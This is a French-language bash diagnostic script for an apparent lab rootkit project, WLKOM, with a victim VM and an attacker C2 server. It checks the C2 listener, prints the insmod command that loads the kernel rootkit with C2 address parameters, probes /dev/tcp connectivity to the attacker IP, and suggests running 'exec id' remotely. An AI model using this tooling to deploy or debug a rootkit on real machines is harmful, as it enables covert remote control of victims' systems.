#!/bin/bash

# ============================================================================
# WLKOM Diagnostic Tool
# ============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info()  { echo -e "${CYAN}[INFO]${NC}  $1"; }
log_ok()    { echo -e "${GREEN}[OK]${NC}    $1"; }
log_warn()  { echo -e "${YELLOW}[WARN]${NC}  $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# ============================================================================
# CONFIG
# ============================================================================

ATTACKER_IP="${1:-192.168.100.10}"
ATTACKER_PORT="${2:-4444}"

# ============================================================================
# TESTS POUR VM ATTAQUANTE (C2 Server)
# ============================================================================

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}TESTS VM ATTAQUANTE (Serveur C2)${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Test 1: Vérifier si le serveur écoute
log_info "Test 1: Vérifier que le serveur C2 écoute sur le port $ATTACKER_PORT"
if netstat -tlnp 2>/dev/null | grep -q ":$ATTACKER_PORT "; then
    log_ok "Serveur C2 écoute sur port $ATTACKER_PORT"
else
    log_error "Serveur C2 NE ÉCOUTE PAS sur port $ATTACKER_PORT"
    echo "   Exécutez: ./wlkom_c2 $ATTACKER_PORT"
    exit 1
fi

# Test 2: Vérifier la configuration réseau
log_info "Test 2: Configuration réseau de la VM attaquante"
MY_IP=$(hostname -I | awk '{print $1}')
log_ok "IP locale: $MY_IP"

# Test 3: Vérifier si le binaire existe
if [ -f "./attacking_program/wlkom_c2" ]; then
    log_ok "Binaire attacking_program/wlkom_c2 trouvé"
else
    log_warn "Binaire wlkom_c2 non trouvé. Compiler avec: make"
fi

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}TESTS VM VICTIME (Rootkit)${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

# Test 4: Vérifier si le rootkit est chargé
log_info "Test 4: Vérifier que le rootkit est chargé"
if lsmod | grep -q "^wlkom "; then
    log_ok "Rootkit chargé"
    ROOTKIT_LOADED=1
else
    log_error "Rootkit NE CHARGE PAS"
    echo ""
    echo "   Pour charger le rootkit sur la VM victime:"
    echo "   $ cd ~/rootkit"
    echo "   $ make"
    echo "   $ sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$ATTACKER_PORT"
    echo ""
    ROOTKIT_LOADED=0
fi

# Si le rootkit est chargé, faire plus de tests
if [ $ROOTKIT_LOADED -eq 1 ]; then
    
    # Test 5: Paramètres du rootkit
    log_info "Test 5: Paramètres passés au rootkit"
    if [ -d "/sys/module/wlkom/parameters" ]; then
        C2_IP=$(cat /sys/module/wlkom/parameters/c2_ip 2>/dev/null || echo "?")
        C2_PORT=$(cat /sys/module/wlkom/parameters/c2_port 2>/dev/null || echo "?")
        log_ok "c2_ip=$C2_IP c2_port=$C2_PORT"
        
        if [ "$C2_IP" != "$ATTACKER_IP" ]; then
            log_warn "L'IP du C2 ($C2_IP) ne correspond pas à celle attendue ($ATTACKER_IP)"
        fi
    fi
    
    # Test 6: Logs du kernel
    log_info "Test 6: Vérifier les logs du kernel (dmesg)"
    echo ""
    dmesg | tail -20 | grep -i wlkom || log_warn "Aucun log WLKOM trouvé"
    echo ""
fi

# Test 7: Connectivité réseau
log_info "Test 7: Test de connectivité vers le serveur"
if timeout 2 bash -c "echo > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT" 2>/dev/null; then
    log_ok "Connexion TCP vers $ATTACKER_IP:$ATTACKER_PORT réussie"
else
    log_error "Impossible de se connecter à $ATTACKER_IP:$ATTACKER_PORT"
    echo ""
    echo "   Vérifiez:"
    echo "   1. L'adresse IP du serveur C2 est correcte"
    echo "   2. Le serveur C2 écoute: ./wlkom_c2 $ATTACKER_PORT"
    echo "   3. Les deux VMs sont sur le même réseau"
fi

# Test 8: Fichier du rootkit
log_info "Test 8: Vérifier le module compilé"
if [ -f "./rootkit/wlkom.ko" ]; then
    log_ok "Module rootkit/wlkom.ko trouvé"
else
    log_warn "Module wlkom.ko non trouvé. Compiler avec: cd rootkit && make"
fi

echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}RÉSUMÉ${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

if [ $ROOTKIT_LOADED -eq 1 ]; then
    log_ok "Rootkit est chargé ✓"
    echo ""
    log_info "Prochaines étapes:"
    echo "  1. Vérifier que le serveur C2 affiche: 'Rootkit authenticated'"
    echo "  2. Le prompt 'WLKOM C2 >' doit s'afficher"
    echo "  3. Taper une commande: exec id"
else
    log_warn "Rootkit n'est pas chargé"
    echo ""
    log_info "Pour charger le rootkit (dans VM victime):"
    echo "  $ cd ~/rootkit"
    echo "  $ make"
    echo "  $ sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$ATTACKER_PORT"
fi

echo ""